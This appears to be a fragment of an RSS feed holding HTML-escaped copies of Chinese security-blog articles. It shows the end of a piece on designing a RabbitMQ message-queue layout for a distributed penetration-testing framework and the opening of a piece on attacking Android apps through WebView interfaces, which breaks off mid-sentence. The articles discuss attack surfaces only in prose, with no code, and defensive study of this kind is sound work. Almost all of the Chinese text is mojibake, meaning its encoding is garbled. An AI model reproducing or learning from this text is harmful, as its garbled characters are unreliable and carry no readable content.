href=&quot;https://www.rabbitmq.com/reliability.html&quot;&gt;https://www.rabbitmq.com/reliability.html&lt;/a&gt;&lt;/blockquote&gt;&lt;h2&gt;&lt;b&gt;å¿…è¦æ€§&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;å¯¹äºæˆ‘ä»¬çš„æ¸—é€æµ‹è¯•ç³»ç»Ÿï¼Œæ¶ˆæ¯é˜Ÿåˆ—çœŸçš„æ˜¯å¿…é¡»çš„ä¹ˆï¼Ÿæˆ‘ä¸ªäººçš„å›ç­”æ˜¯å¿…é¡»çš„ã€‚&lt;/p&gt;&lt;h2&gt;&lt;b&gt;ä¸»è¦ç‰¹æ€§ï¼šè§£å†³æœåŠ¡ï¼ˆæ¨¡å—ï¼‰é€šä¿¡é—®é¢˜&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;é€šä¿¡ä¸ä»…ä»…æ˜¯ â€œæˆ‘å‘é€ï¼Œä½ æ”¶åˆ°â€ è¿™ä¹ˆç®€å•çš„äº‹æƒ…ã€‚ä»æœ¬æ–‡æ¡†æ¶çš„æ¶æ„æ•´ä½“ä¸Šæ¥è¯´ï¼Œæ˜¯ä¸€ä¸ª &lt;b&gt;Master / Slaves&lt;/b&gt; çš„æ¶æ„æ¨¡å¼ï¼Œä¹Ÿå°±æ˜¯è¯´ä¸€ä¸ª Master å’Œå¤šä¸ª Slaves åŒæ—¶è¿›è¡Œé€šä¿¡ï¼Œå½“ç„¶é€šä¿¡çš„ç§ç±»ä¹Ÿå¤šç§å¤šæ ·ï¼š&lt;/p&gt;&lt;ul&gt;&lt;li&gt;ä»»åŠ¡åˆ†å‘é€šä¿¡ï¼ˆå¤šå¯¹å¤šï¼‰ï¼šMaster å‘ Slaves åˆ†å‘ä»»åŠ¡ï¼Œè¿™ä¸ªé€šä¿¡æ¨¡å‹æ›´åƒæ˜¯ä¸€ä¸ª &lt;b&gt;Producer / Consumer&lt;/b&gt; çš„æ¨¡å¼ï¼Œè¿™å¾ˆå¥½ç†è§£ï¼ŒMaster å‘é€ä»»åŠ¡ï¼ŒSlaves æ‰§è¡Œï¼Œæˆ‘ä»¬è‡ªç„¶ä¿è¯å¹¶ä¸æƒ³å¤šä¸ª Slave åŒæ—¶æ¥åšä¸€ä¸ªä»»åŠ¡ï¼Œè¿™æ ·å°±ç™½ç™½æµªè´¹äº†èµ„æºã€‚&lt;/li&gt;&lt;li&gt;é€šçŸ¥ä¸è®¢é˜…æ¶ˆæ¯é€šä¿¡ï¼ˆä¸€å¯¹å¤šï¼‰ï¼šå¯ä»¥ç®€å•æƒ³è±¡ä¸€ä¸‹å¹¿æ’­ä¸ç»„æ’­çš„éœ€æ±‚ï¼Œè¿™ç§é€šä¿¡æ¨¡å‹æˆ‘ä»¬å¯ä»¥æš‚ä¸”ç§°ä¹‹ä¸º &lt;b&gt;FanOut&lt;/b&gt; å§ã€‚å…¶å®è¿™ä¹Ÿéå¸¸å¥½ç†è§£ï¼Œå½“ä½ çš„ Master æƒ³è¦å‘é€ä¸€ä¸ªé€šçŸ¥æ¶ˆæ¯ï¼Œè¿™ä¸ªæ¶ˆæ¯å¯èƒ½æ˜¯é’ˆå¯¹å…¨ä½“çš„ Slaves çš„ï¼Œè¿™æ ·æœ€åˆé€‚çš„åŠæ³•å°±æ˜¯ä½¿ç”¨å¹¿æ’­é€šä¿¡æ¨¡å¼ï¼›åŒæ ·çš„ï¼Œå½“ä½ çš„ Master æƒ³è¦é’ˆå¯¹æŸä¸€ä¸ªç»„å‘é€é€šçŸ¥ï¼ˆä¾‹å¦‚å…³é—­æ‰€æœ‰çš„çˆ¬è™«æ¨¡å—ç»„ï¼Œå‡çº§æŸä¸€ä¸ªç»„çš„æ•°æ®åº“ï¼Œæˆ–è€…æ›´æ–°ä»£ç ï¼Œéƒ¨ç½²æ–°çš„åŠŸèƒ½ï¼‰ï¼Œè¿™ç±»é€šçŸ¥ä½ æ˜¯ä¸å¸Œæœ›è¢«å…¶ä»–æ— å…³ç»„æˆ–è€…æ— å…³èŠ‚ç‚¹æ”¶åˆ°çš„ã€‚é’ˆå¯¹è¿™äº›æƒ…å†µï¼ŒFanOut å¯ä»¥å¾ˆå¥½è§£å†³ã€‚&lt;/li&gt;&lt;li&gt;ç‚¹å¯¹ç‚¹ï¼ˆä¸€å¯¹ä¸€ï¼‰ï¼šè¿™é‡Œä¸»è¦ä¸æ¶‰åŠ Slave ä¸ Slave çš„é€šä¿¡ï¼Œæˆ‘ä»¬çš„æ¶æ„ä¼¼ä¹å¹¶ä¸å–œæ¬¢ Slave ä¸ Slave ä¹‹é—´æœ‰è”ç³»ï¼Œè¿™æ ·ä¼šæå¤§å¢åŠ è€¦åˆåº¦å’Œå¤æ‚åº¦ï¼›ä½†æ˜¯ Master åˆ° Slave çš„å•ç‚¹é€šä¿¡æ—¶å¿…é¡»è¦æœ‰çš„ï¼Œå› ä¸ºæˆ‘ä»¬ç»å¸¸ä¼šéœ€è¦å•ç‹¬å‘Šè¯‰ä¸€ä¸ª Slave åº”è¯¥å¹²å•¥ï¼ˆå…³é—­ Slaveï¼Œé‡å¯ Slave ç”šè‡³ å‡çº§ Slaveï¼‰&lt;/li&gt;&lt;li&gt;ç»“æœæ±‡æŠ¥ä¸ç”Ÿå­˜çŠ¶å†µæ±‡æŠ¥ï¼ˆå¤šå¯¹å¤šï¼‰ï¼šä½œä¸ºæ— çŠ¶æ€çš„ Slaveï¼Œå®Œæˆä¸€ä¸ªä»»åŠ¡çš„ç¬¬ä¸€ä»¶äº‹ï¼Œåº”è¯¥å°±æ˜¯æŠŠä»»åŠ¡ä¼ å› Masterï¼›å½“ç„¶ï¼Œä½œä¸º Masterï¼Œæ˜¯æœ‰å¿…è¦çŸ¥é“ Slave çš„ä¸€äº›ç”Ÿå­˜çŠ¶å†µçš„ï¼Œé™¤äº†ä¸»åŠ¨é—®è¯¢çš„æ–¹æ³•ä¹‹å¤–ï¼ŒSlave è¿˜åº”è¯¥ä¸»åŠ¨å‘ Master è¿›è¡Œæ±‡æŠ¥ï¼›åŒæ—¶ï¼ŒSlave çš„å…³é”®éƒ¨åˆ†æŒ‚æ‰äº†ï¼Œé”™è¯¯ä¿¡æ¯ï¼æ—¥å¿—ï¼Œä¹Ÿåº”è¯¥ä¼ å› Masterâ€¦â€¦ è¿™æ ·çš„éœ€æ±‚å…¶å®ä¸€ç‚¹éƒ½ä¸è¿‡åˆ†ï¼Œæˆ‘ä»¬éœ€è¦ä¸€ä¸ª &lt;b&gt;FanIn&lt;/b&gt; çš„æ¨¡å‹å»è§£å†³è¿™ç§é—®é¢˜ã€‚&lt;/li&gt;&lt;/ul&gt;&lt;h2&gt;&lt;b&gt;æ¬¡è¦ç‰¹æ€§ï¼šå¯é æ€§ï¼å®‰å…¨æ€§&lt;/b&gt;&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;å¯é æ€§ï¼šåœ¨æ­£å¸¸å·¥ä½œçš„æ¡ä»¶ä¸‹ï¼Œä½ çš„é€šä¿¡ä¸¤ç«¯æ‹¿åˆ°çš„æ•°æ®æ˜¯æ— å·®åˆ«çš„ä¸ä¼šå‡ºç°æ•°æ®çš„å·®åˆ«ï¼Œå¹¶ä¸”ä¸ä¼šæ— æ•…ä¸¢å¤±æ•°æ®ï¼Œå‡ºç°ä¸æœŸæœ›çš„æ•°æ®ã€‚ä½ å¯ä»¥ä¿¡èµ–ä½ çš„æ•°æ®æ¥æºã€‚&lt;/li&gt;&lt;li&gt;å®‰å…¨æ€§ï¼šä¸å¸Œæœ›æ•°æ®è¢«åˆ«äººæˆªå–é€ æˆä¿¡æ¯æ³„æ¼ï¼Œæˆ–è€…å› ä¸ºååºåˆ—åŒ–æ¼æ´é€ æˆ RCEï¼Œæˆ–è€…å‘½ä»¤æ³¨å…¥ï¼Œæˆ–è€…æœªçŸ¥çš„é£é™©ï¼Œé€šä¿¡éœ€è¦æ”¯æŒ SSL &lt;/li&gt;&lt;/ul&gt;&lt;p&gt;è€Œä¸€ä¸ªå¯é çš„æ¶ˆæ¯é˜Ÿåˆ—ï¼Œå®ƒæœ¬èº«ä¼šæœ‰ä¸€æ•´å¥—çš„æœºåˆ¶ä¿è¯æ¶ˆæ¯ä»ä¸€ç«¯åˆ°å¦å¤–ä¸€ç«¯æ˜¯å¯é çš„ï¼Œä½ å¯ä»¥ä¸å¿…æ‹…å¿ƒä½ çš„æ¶ˆæ¯åœ¨é€šä¿¡çš„è¿‡ç¨‹ä¸­ä¸¢å¤±ï¼åœ¨æ¶ˆæ¯é˜Ÿåˆ—ä¸­ä¸¢å¤±ï¼ˆå› ä¸ºæœºå™¨é‡å¯æˆ–å…¶ä»–ä¸å¯é¢„æ–™çš„å› ç´ ï¼‰ã€‚æˆ‘ä»¬ä»¥ RabbitMQ åšä¾‹å­ï¼Œä¸¾ä¾‹ä¸€ä¸‹ RabbitMQ åœ¨æ•°æ®å¯é æ€§å’Œä¸€è‡´æ€§ä¸Šåšçš„ä¸€äº›å·¥ä½œï¼š&lt;/p&gt;&lt;blockquote&gt;&lt;b&gt;Ensuring Messages are Routed&lt;/b&gt;&lt;br&gt;In some circumstances it can be important for producers to ensure that their messages are being routed to queues (although not always - in the case of a pub-sub system producers will just publish and if no consumers are interested it is correct for messages to be dropped).&lt;br&gt;ç¡®ä¿æ¶ˆæ¯ä¸€å®šæ˜¯è¢«è·¯ç”±å¤„ç†çš„ï¼šåœ¨ç»å¤§å¤šæ•°æƒ…å†µä¸‹ï¼ŒRabbitMQ éƒ½å¯ä»¥è®©ç”Ÿäº§è€…ç¡®è®¤æ¶ˆæ¯é€šè¿‡è·¯ç”±å·²ç»è¢«ä¼ é€’è¿›äº†æ¶ˆæ¯é˜Ÿåˆ—ä¸­ï¼ˆé™¤äº†æ²¡æœ‰è®¢é˜…è€…çš„ &lt;b&gt;å‘å¸ƒ-è®¢é˜…&lt;/b&gt; ç³»ç»Ÿï¼‰&lt;br&gt;&lt;br&gt;&lt;b&gt;At the Consumer&lt;/b&gt;&lt;br&gt;In the event of network failure (or a node crashing), messages can be duplicated, and consumers must be prepared to handle them. If possible, the simplest way to handle this is to ensure that your consumers handle messages in an idempotent way rather than explicitly deal with deduplication.&lt;br&gt;åœ¨èŠ‚ç‚¹å´©æºƒæˆ–è€…ç½‘ç»œé”™è¯¯çš„æ—¶å€™ï¼Œæ¶ˆæ¯å¯èƒ½ä¼šå‡ºç°é‡å¤ï¼Œä¸æ­¤åŒæ—¶æ¶ˆè´¹è€…å¿…é¡»å¯¹é‡å¤æœ‰è§£å†³åŠæ³•ã€‚å¦‚æœæƒ³è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œæœ€ç®€å•çš„æ–¹æ³•å°±æ˜¯ä½¿ç”¨å¹‚ç­‰è¿™ç§æ–¹æ³•ï¼ˆè€Œä¸æ˜¯ç›´æ¥å¤„ç†ï¼‰ã€‚&lt;br&gt;&lt;br&gt;If a message is delivered to a consumer and then requeued (because it was not acknowledged before the consumer connection dropped, for example) then RabbitMQ will set the redeliveredflag on it when it is delivered again (whether to the same consumer or a different one).&lt;br&gt;... &lt;br&gt;Conversely if the redelivered flag is not set then it is guaranteed that the message has not been seen before. Therefore if a consumer finds it more expensive to deduplicate messages or process them in an idempotent manner, it can do this only for messages with the redeliveredflag set.&lt;br&gt;å¦‚æœä¸€ä¸ªå·²ç»è¢«é€åˆ°äº†æ¥æ”¶æ–¹ï¼Œä½†æ˜¯å› ä¸ºæ²¡æœ‰ ACKï¼Œæ¶ˆæ¯ä¼šè¢«é‡æ–°è¿›å…¥æ¶ˆæ¯é˜Ÿåˆ—ï¼›ä½†æ˜¯å¦‚æœä½ æƒ³è®©æ¶ˆæ¯å†å›åˆ°è¿™ä¸ªæ²¡æœ‰ ACK çš„æ¥å—æ–¹ï¼Œä½ éœ€è¦å‘è®©ä½ çš„æ¶ˆæ¯è®¾ç½®ä¸€ä¸ª &lt;b&gt;Redeliveredflag&lt;/b&gt;ï¼Œå¦‚æœè¿™æ ·çš„è¯ï¼Œä½ çš„æ¥æ”¶æ–¹ä¼šé‡æ–°æ¥å—åˆ°é‚£ä¸ªæ²¡æœ‰ ACK çš„ä¿¡æ¯ã€‚&lt;br&gt;â€¦&lt;br&gt;åè¿‡æ¥è¯´å¦‚æœ redelivered flag æ²¡æœ‰è¢«è®¾ç½®çš„è¯ï¼Œå°±å¯ä»¥ç¡®ä¿ä½ æ¥æ”¶æ–¹éƒ½ä¸ä¼šå—åˆ°é‡å¤çš„æ¶ˆæ¯äº†ã€‚å› æ­¤å§ï¼Œæˆ‘ä»¬å…¶å®å¹¶ä¸æ˜¯å¿…é¡»åœ¨åº”ç”¨ä¸šåŠ¡å±‚è¿›è¡Œå¹‚ç­‰æ–¹æ³•ï¼Œå¯ä»¥ç®€å•çš„ä½¿ç”¨æ¶ˆæ¯é˜Ÿåˆ—çš„è¿™ä¸ªç‰¹æ€§ã€‚&lt;/blockquote&gt;&lt;h2&gt;&lt;b&gt;é€‰å‹ï¼ˆå¯ç¼–ç¨‹çš„åè®® - RabbitMQï¼‰&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;æˆ‘ä»¬åœ¨è¿™é‡Œé€‰æ‹© RabbitMQ ä½œä¸ºæˆ‘ä»¬æ¶ˆæ¯é˜Ÿåˆ—æ”¯æŒï¼Œæ¥ä¸‹æ¥ç»“åˆ RabbitMQ çš„ç‰¹å¾å’Œæˆ‘ä»¬çš„æ¡†æ¶ç‰¹æ€§ï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•ç®€å•è®¾è®¡ä¸€ä¸‹å…³é”®çš„æ¶ˆæ¯é˜Ÿåˆ—ç»“æ„ã€‚å…¶å®å¯¹äºæˆ‘ä»¬çš„ RabbitMQ æ¥è¯´ï¼Œæ¶ˆæ¯é˜Ÿåˆ—çš„è®¾è®¡ä¹Ÿä¼šç›¸å½“æ„‰å¿«ï¼Œæˆ‘ä»¬çš„å‘é€æ–¹å…¶å®æ˜¯ä¸çŸ¥é“æ¥æ”¶æ–¹å…·ä½“çš„æ¶ˆæ¯é˜Ÿåˆ—çš„ï¼Œæ¶ˆæ¯é˜Ÿåˆ—å…¶å®åªæ˜¯ä¸€ä¸ªå­˜åœ¨äºæ¥æ”¶æ–¹çš„æ¦‚å¿µã€‚åœ¨å‘é€æ–¹ï¼Œåªæœ‰äº¤æ¢æœºå’Œè·¯ç”±çš„æ¦‚å¿µã€‚æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä¸åŒäº¤æ¢æœºçš„ç§ç±»é…åˆè·¯ç”±æ¥å®ç°ã€‚&lt;/p&gt;&lt;h2&gt;&lt;b&gt;äº¤æ¢æœº&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;åœ¨ RabbitMQ ä¸­ï¼Œäº¤æ¢æœºæœ‰å››ç§ç±»å‹ï¼š&lt;/p&gt;&lt;ul&gt;&lt;li&gt;Direct Exchangeï¼ˆç›´è¿äº¤æ¢æœºï¼‰ï¼šç”± routing_key æä¾›ä¸€å¯¹ä¸€çš„ç›´è¿æœåŠ¡ï¼Œè¿™æ ·å°±å¯ä»¥è§£å†³ Master åˆ°å•ä¸ªèŠ‚ç‚¹æˆ–è€…åŠŸèƒ½å•å…ƒçš„é—®é¢˜ã€‚&lt;/li&gt;&lt;li&gt;Fanout Exchangeï¼ˆæ‰‡å‡ºäº¤æ¢æœºï¼‰ ï¼šæä¾›ä¸€ï¼ˆä¸€ä¸ªäº¤æ¢æœºï¼‰å¯¹å¤šçš„æ¶ˆæ¯äº¤æ¢æœåŠ¡ï¼Œå¯ä»¥è§£å†³ Master åˆ°æ‰€æœ‰èŠ‚ç‚¹çš„é€šçŸ¥é—®é¢˜ï¼Œä½†æ˜¯è¿™ä¸ªéœ€æ±‚å®é™…ä¸Šå¹¶ä¸æ˜¯ç‰¹åˆ«çš„å¿…è¦ï¼ˆé™¤äº†æ•´ä¸ªç³»ç»Ÿåœ¨è¿›è¡Œå¤§çš„å‡çº§ï¼å…³é—­çš„æ—¶å€™ï¼‰ï¼Œå¹¶ä¸æ˜¯éå¸¸å¸¸ç”¨ã€‚&lt;/li&gt;&lt;li&gt;Topic Exchangeï¼ˆä¸»é¢˜äº¤æ¢æœºï¼‰ ï¼šè¿™ä¸ªå…¶å®ä¹Ÿå¯ä»¥è¯´æ˜¯å’Œ Fanout Exchange æœ‰ä¸€ç‚¹ç±»ä¼¼ï¼Œåªè¦è®¢é˜…äº†ä¸€ä¸ªä¸»é¢˜å°±å¯ä»¥æ”¶åˆ°è¿™ä¸ªä¸»é¢˜çš„ç›¸å…³ä¿¡æ¯äº†ï¼Œå½“ç„¶è®¢é˜…ä¸»é¢˜çš„æ–¹æ³•ä¹Ÿååˆ†çµæ´»ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™ä¸ªäº¤æ¢æœºï¼Œå‘å„ä¸ªç»„ï¼ ç±»å‹ï¼å…·æœ‰æŸä¸ªé¢„è®¾ç‰¹å¾çš„åŠŸèƒ½å•å…ƒæˆ–è€…èŠ‚ç‚¹å‘é€æ¶ˆæ¯ã€‚&lt;/li&gt;&lt;li&gt;Header Exchangeï¼ˆé¦–éƒ¨äº¤æ¢æœºï¼‰ ï¼š Direct Exchange çš„å¦å¤–ä¸€ç§è¡¨ç°å½¢å¼ï¼Œåªæ˜¯ä¸æ˜¯ä½¿ç”¨ routing_key è¿›è¡Œè·¯ç”±çš„ï¼Œæ˜¯ç”±æœ¬èº«çš„ä¸€ä¸ª headers æ¥æ§åˆ¶çš„ã€‚&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;æ ¹æ®è¿™å››ç§ç±»å‹çš„äº¤æ¢æœºï¼Œæˆ‘ä»¬å¾ˆå®¹æ˜“è®¾è®¡å‡ºæˆ‘ä»¬çš„é€šä¿¡ç³»ç»Ÿã€‚ï¼ˆå½“å®é™…çš„ä½¿ç”¨ï¼Œæˆ‘ä»¬å¹¶ä¸ä¼šå…¨éƒ¨é€‰æ‹©ï¼‰&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-2302768d687ada1e47bb8424401f393a_r.jpg&quot; data-rawwidth=&quot;1744&quot; data-rawheight=&quot;1286&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;ä¸‹é¢ä¾æ¬¡å¯¹å‡ ä¸ªäº¤æ¢æœºåšç®€è¦è¯´æ˜ï¼š&lt;/p&gt;&lt;ol&gt;&lt;li&gt;ä»»åŠ¡åˆ†å‘äº¤æ¢æœºï¼ˆ Direct Exchange ï¼‰ï¼Œæ¯ä¸€ç§ç±»å‹çš„ä»»åŠ¡æ˜¯ä¸€ä¸ªè·¯ç”±é”®ï¼ŒèŠ‚ç‚¹éœ€è®¾ç½®è¿™ä¸ªè·¯ç”±é”®æ‰èƒ½æ”¶åˆ°ä»»åŠ¡ã€‚åœ¨å®¢æˆ·ç«¯ï¼Œæ¯ä¸€ç±»å‹çš„åŠŸèƒ½å•å…ƒè¦è®¾ç½®ç›¸åŒçš„è·¯ç”±é”®ï¼ˆç±»å‹åï¼‰ï¼Œæ‰å¯ä»¥æ¥æ”¶åˆ°ä»»åŠ¡&lt;/li&gt;&lt;li&gt;ç»“æœæ”¶é›†äº¤æ¢æœºï¼ˆ Topic Exchange ï¼‰ï¼Œæ—¥å¿—è®°å½•ç³»ç»Ÿå’Œå®¡è®¡ç³»ç»Ÿæˆ–è€…å…¶ä»–ç³»ç»Ÿéƒ½å¯ä»¥é€šè¿‡è¿™ä¸ªç»“æœæ”¶é›†äº¤æ¢æœºè®¢é˜…åˆ°è‡ªå·±æƒ³è¦æŸ¥çœ‹çš„ç»“æœã€‚åŒæ ·ï¼Œå¦‚æœå¼€å‘æ–°çš„æœåŠ¡æˆ–è€…æ¨¡ç»„ä¹Ÿå¯ä»¥é€šè¿‡è®¢é˜…ç»“æœäº¤æ¢æœºå»è·å–ä»»åŠ¡æ‰§è¡Œçš„ç»“æœã€‚&lt;/li&gt;&lt;li&gt;æ§åˆ¶äº¤æ¢æœºï¼ˆ Direct Exchange ï¼‰ï¼Œç›´æ¥ç®¡ç†èŠ‚ç‚¹çš„è¡Œä¸ºï¼ˆå¯åŠ¨ï¼åœæ­¢ï¼æ›´æ–°ï¼‰ï¼Œå½“ç„¶è¿™ä¸ªæ§åˆ¶äº¤æ¢æœºçš„è·¯ç”±é”®ä¸ºè¿™ä¸ªèŠ‚ç‚¹çš„ GUID æˆ– UUIDï¼Œè¿™æ ·å¯ä»¥å®ç° Master åˆ° Slave çš„å•ç‚¹é“¾æ¥ã€‚&lt;/li&gt;&lt;li&gt;é€šçŸ¥äº¤æ¢æœºï¼ˆ Topic Exchange ï¼‰ï¼ŒæŒ‰åŠŸèƒ½å•å…ƒçš„ç±»å‹åˆ†ç»„ï¼Œæ§åˆ¶äº¤æ¢æœºçš„æ‰¹é‡æ“ä½œï¼ˆå¯¹æŸä¸€ç§ç±»å‹çš„åŠŸèƒ½å•å…ƒè¿›è¡Œæ›´æ–°æ•°æ®åº“ï¼Œçƒ­è¡¥ä¸ï¼æ‰¹é‡å…³é—­ï¼‰ã€‚&lt;/li&gt;&lt;li&gt;åé¦ˆäº¤æ¢æœºï¼ˆ Topic Exchange ï¼‰ï¼ŒåŒç»“æœäº¤æ¢æœºã€‚&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;å…¶ä¸­ï¼Œä»»åŠ¡åˆ†å‘å’Œç»“æœæ”¶é›†æ˜¯å±äºäº‹åŠ¡ï¼ˆä»»åŠ¡ï¼‰ç®¡ç†æœåŠ¡çš„ï¼Œæ§åˆ¶ï¼é€šçŸ¥ï¼åé¦ˆäº¤æ¢æœºæ˜¯å±äºèŠ‚ç‚¹ï¼ˆåŠŸèƒ½å•å…ƒï¼‰ç®¡ç†æœåŠ¡çš„ã€‚è¿™æ ·æˆ‘ä»¬å¯ä»¥æŠŠç®¡ç†ä¸ä¸šåŠ¡ï¼Œé€šè¿‡æ¶ˆæ¯é˜Ÿåˆ—è¿›è¡Œå®Œç¾åˆ†ç¦»ã€‚&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;ä¸Šæ–‡æè¿°äº†ä¸€ä¸ªåˆ†å¸ƒå¼æ¸—é€æ¡†æ¶è¯¥æœ‰çš„éƒ¨åˆ†ï¼Œä½†æ˜¯é™äºç¯‡å¹…ï¼Œæˆ‘ä»¬æ²¡æœ‰åŠæ³•æŠŠæ¯ä¸€ä¸ªéƒ¨åˆ†éƒ½çš„è®¾è®¡æ€è·¯éƒ½æè¿°æ¸…æ¥šã€‚ç¬”è€…èƒ½åŠ›æœ‰é™ï¼Œæ–‡ä¸­å¦‚æœ‰çº°æ¼ï¼Œå¸Œæœ›è¯»è€…ä¸åèµæ•™ã€‚&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;PS: çŸ¥ä¹çš„ç¼–è¾‘å™¨è«åå…¶å¦™ç²’å­æ€åƒæ‰åˆ—è¡¨çš„ Tab å¯¼è‡´åˆ—è¡¨å‡ºç°æ ¼å¼ Bugï¼Œç¬”è€…ç»è¿‡å°è¯•æ— æ³•ä¿®å¥½ ğŸ˜¢&lt;/p&gt;</description>
<author>v1ll4n</author>
<guid isPermaLink="false">2017-08-25-28781870</guid>
<pubDate>Fri, 25 Aug 2017 00:00:00 +0800</pubDate>
</item>
<item>
<title>é€šè¿‡ WebView æ”»å‡» Android åº”ç”¨</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2017-07-26-28107901.htm</link>
<description>&lt;meta charset=&quot;utf-8&quot;&gt;
&lt;title&gt;é€šè¿‡ WebView æ”»å‡» Android åº”ç”¨&lt;/title&gt;
&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/28107901&quot;&gt;åŸæ–‡&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-be9ee8b4483f67962aecb8f34a82ed65_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;WebView å¯åœ¨åº”ç”¨ä¸­åµŒå…¥ä¸€ä¸ªå†…ç½®çš„ Web æµè§ˆå™¨ï¼Œæ˜¯ Android åº”ç”¨å¼€å‘å¸¸ç”¨çš„ç»„ä»¶ä¹‹ä¸€ã€‚é€šè¿‡ WebView å¯¹ Android åº”ç”¨çš„æ”»å‡»æ¡ˆä¾‹å±¡è§ä¸é²œï¼Œæ¯”å¦‚å‡ å¹´å‰å°±è¢«ç©åçš„ addJavascriptInterface è¿œç¨‹ä»£ç æ‰§è¡Œã€‚ä½†ä¿®å¤äº† addJavascriptInterface å¹¶ä¸è¡¨ç¤ºå°±èƒ½é«˜æ•æ— å¿§ã€‚åº”ç”¨åœ¨ WebView ä¸Šä¸º Javascript æä¾›çš„æ‰©å±•æ¥å£ï¼Œå¯èƒ½å› ä¸ºæ¥å£æœ¬èº«çš„é—®é¢˜è€Œå˜æˆå®‰å…¨æ¼æ´ã€‚&lt;/p&gt;&lt;p&gt;é™¤æ­¤ä¹‹å¤–ï¼Œåœ¨æ²¡æœ‰å¯ç”¨è¿›ç¨‹éš”ç¦»çš„ WebView ä¸ App å…·æœ‰ç›¸åŒæƒé™ï¼Œè·å¾—ä»»æ„ä»£ç æ‰§è¡Œåå¯ä»¥è®¿é—®åº”ç”¨ç§æœ‰æ•°æ®æˆ–å…¶ä»–ç³»ç»Ÿæ¥å£ï¼Œå¯ä»¥å°†æµè§ˆå™¨æ¼æ´ç§»æ¤åˆ°æ‰‹æœºå¹³å°ä¸Šå¯¹åº”ç”¨è¿›è¡Œé’ˆå¯¹æ€§æ”»å‡»ã€‚éƒ¨åˆ†å‚å•†ä½¿ç”¨è‡ªè¡ŒåŸºäºå¼€æºæµè§ˆå™¨å¼•æ“ fork è€Œæ¥çš„å†…æ ¸ï¼Œä¹Ÿå¯èƒ½å› ä¸ºåŒæ­¥ä¸Šæ¸¸è¡¥ä¸ä»£ç ä¸åŠæ—¶è€Œå‡ºç°å¯åˆ©ç”¨çš„æ¼æ´ã€‚&lt;/p&gt;&lt;p&gt;åœ¨ Android N ä¸­å¢åŠ äº†ä¸€ä¸ªå¼€å‘è€…é€‰é¡¹ï¼Œå°±æ˜¯åœ¨æ‰€æœ‰çš„åº”ç”¨ä¸­å°† WebView çš„æ¸²æŸ“è¿›ç¨‹è¿è¡Œåœ¨ç‹¬ç«‹çš„æ²™ç®±ä¸­ã€‚å³ä½¿æ¶æ„ç½‘é¡µé€šè¿‡æ¼æ´åœ¨æ¸²æŸ“è¿›ç¨‹ä¸­æ‰§è¡Œäº†ä»£ç ï¼Œè¿˜éœ€è¦æ›´å¤šçš„æ¼æ´ç»•è¿‡æ²™ç®±çš„é™åˆ¶ã€‚è¿™ä¸€ç‰¹æ€§å°†&lt;a href=&quot;https://developer.android.com/preview/behavior-changes.html#security-all&quot;&gt;åœ¨ Android O ä¸­é»˜è®¤å¯ç”¨&lt;/a&gt;ã€‚ä½†åœ¨è¿™ä¸€ç¼“è§£æªæ–½æ­£å¼éƒ¨ç½²åˆ°å¤§éƒ¨åˆ†è®¾å¤‡ä¹‹å‰ï¼Œé€šè¿‡æ”»å‡» WebView è·å¾—è¿œç¨‹ä»£ç æ‰§è¡Œè¿›è€Œç›´æ¥æ”»å‡»åº”ç”¨ä»ç„¶æ˜¯å¯è¡Œçš„ã€‚&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-51e68d06636afabcdb96e97fcc7aa8ca_r.png&quot; data-rawwidth=&quot;1440&quot; data-rawheight=&quot;1144&quot;&gt;&lt;h2&gt;Beyond addJavascriptInterface&lt;/h2&gt;&lt;p&gt;æœ¬æ–‡å¹¶ä¸æ‰“ç®—ç‚’ addJavascriptInterface çš„å†·é¥­ï¼Œè€Œæ˜¯å…³æ³¨åœ¨æ¥å£æœ¬èº«çš„å®ç°ä¸Šã€‚&lt;/p&gt;&lt;p&gt;å³ä½¿æ˜¯ä½¿ç”¨äº†ç›¸å¯¹å®‰å…¨çš„é€šä¿¡æ‰‹æ®µï¼ˆå¦‚ shouldOverrideUrlLoading æˆ– onJsAlert ä¹‹ç±»å›è°ƒçš„æ–¹æ¡ˆï¼Œæˆ–æ˜¯å…¶ä»–åŸºäºç±»ä¼¼æ–¹æ¡ˆçš„å¼€æºé€šä¿¡åº“ï¼‰ï¼Œå¦‚æœåº”ç”¨æ¥å£è®¾è®¡ä¸å½“ï¼Œä»ç„¶å­˜åœ¨è¢«æ¶æ„é¡µé¢é€šè¿‡ js æ‰§è¡Œä»»æ„ä»£ç çš„å¯èƒ½ã€‚&lt;/p&gt;&lt;p&gt;&lt;b&gt;åˆ©ç”¨å¯å†™å…¥çš„å¯æ‰§è¡Œæ–‡ä»¶&lt;/b&gt;&lt;/p&gt;&lt;p&gt;è¿™ä¸€ç§æ”»å‡»æ–¹å¼éœ€è¦ç»“åˆä¸¤ç§ç±»å‹çš„æ¼æ´ï¼Œä¸€æ˜¯èƒ½åœ¨æœ¬åœ°å†™å…¥è·¯å¾„å’Œå†…å®¹å¯æ§çš„æ–‡ä»¶ï¼ŒäºŒæ˜¯åº”ç”¨ä¸­å­˜åœ¨åŠ¨æ€åŠ è½½ä¸å¯ä¿¡ä»£ç çš„é€»è¾‘ã€‚é€»è¾‘æ¼æ´ä¸æ¶‰åŠå†…å­˜ç 